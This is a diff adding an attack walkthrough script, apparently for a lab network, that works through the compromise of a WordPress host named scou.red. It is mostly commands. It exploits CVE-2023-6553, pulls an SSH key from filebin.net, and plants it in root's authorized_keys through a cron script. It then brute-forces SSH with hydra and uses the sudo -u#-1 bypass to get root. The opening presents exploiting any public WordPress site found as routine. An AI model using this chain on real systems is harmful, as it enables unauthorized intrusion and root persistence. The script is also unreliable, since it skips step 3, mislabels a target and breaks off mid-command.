@@ -1,0 +1,57 @@
+# Scenario:
+# attack scou.red domain
+#
+#
+# 1. After a new critical wordpress vulnerability was announced, you decided to 
+# 	test it against all the public word press sites you could find until you 
+# 	found one - scou.red.
+# 	We start by running the exploit and getting a low-priv shell.
+# 
+#
+# Controller = 10.0.75.0
+#
+# Public1 = 10.0.12.187
+# Public2 = 10.0.15.174
+#
+# NTP = 10.0.145.123
+# DB = 10.0.8.23
+#
+# Web = 10.0.136.7 | 18.189.187.209
+# PC1 = 10.0.133.25
+# PC2 = 10.0.137.96
+# PC3 = 10.0.128.166
+
+python ~/CVE-2023-6553/exploit.py --url http://scou.red
+
+# 2. Now let's see if we can privesc - what do we have to work with? Maybe a crontab that runs as root?
+
+cat /var/spool/cron/crontabs/root
+
+# can we modify /var/backup.sh?
+
+ls -l /var/backup.sh
+
+# Our scans tell us SSH is running - can we add our public key to login as root?
+
+wget https://filebin.net/mvv9x8ca3vhy8tj9/pubkey.txt # pull down our public key
+readlink -nf pubkey.txt # what directory are we in?
+echo "cat /srv/www/wordpress/wp-content/plugins/backup-backup/includes/pubkey.txt >> /root/.ssh/authorized_keys" >> /var/backup.sh
+
+# Let's try logging in through SSH
+
+ssh root@scou.red # from normal terminal
+
+# 4. Scan DB
+
+nmap 10.0.145.123
+
+printf "root\nadmin\nuser\n" > users.txt
+printf "root\npassword\npass\n" > passwords.txt
+hydra -L users.txt -P passwords.txt ssh://10.0.145.123 # gives login credentials 
+ssh user@10.0.145.123 # password
+
+# 5. find / -type f -perm -u=s 2>/dev/null
+ssh user@10.0.136.7
+sudo -u#-1 /bin/bash
+cd /root ls
+cat
